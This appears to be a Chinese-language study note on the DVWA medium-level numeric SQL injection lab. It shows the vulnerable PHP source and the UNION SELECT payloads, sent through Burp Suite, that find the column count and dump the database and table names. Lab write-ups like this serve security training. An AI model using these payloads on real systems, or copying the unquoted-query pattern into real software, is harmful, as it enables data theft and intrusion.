# sql injection(medium) :数字型注入

# 目录源码/页面源码
```
<?php

if( isset( $_POST[ 'Submit' ] ) ) {
    // Get input
    $id = $_POST[ 'id' ];

    $id = mysqli_real_escape_string($GLOBALS["___mysqli_ston"], $id);

    $query  = "SELECT first_name, last_name FROM users WHERE user_id = $id;";
    $result = mysqli_query($GLOBALS["___mysqli_ston"], $query) or die( '<pre>' . mysqli_error($GLOBALS["___mysqli_ston"]) . '</pre>' );

    // Get results
    while( $row = mysqli_fetch_assoc( $result ) ) {
        // Display values
        $first = $row["first_name"];
        $last  = $row["last_name"];

        // Feedback for end user
        echo "<pre>ID: {$id}<br />First name: {$first}<br />Surname: {$last}</pre>";
    }

}

// This is used later on in the index.php page
// Setting it here so we can close the database connection in here like in the rest of the source scripts
$query  = "SELECT COUNT(*) FROM users;";
$result = mysqli_query($GLOBALS["___mysqli_ston"],  $query ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );
$number_of_rows = mysqli_fetch_row( $result )[0];

mysqli_close($GLOBALS["___mysqli_ston"]);
?> 
```



# POST请求

# `$id`外面没有单引号包裹,数字型注入

# `$id = mysqli_real_escape_string($GLOBALS["___mysqli_ston"], $id);`
## `mysqli_real_escape_string()` :将单引号`'`、双引号`"`等特殊字符转义(加上反斜杠`\`)


# burpsuite抓包改包
# 1、找显示位(判断列数)
## `-1 union select 1,2`(如果页面回显了1和2说明有2列)
# 2、爆库名
## `id=-1 union select 1,database()`
# 3、爆表名
## `id=-1 union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()`

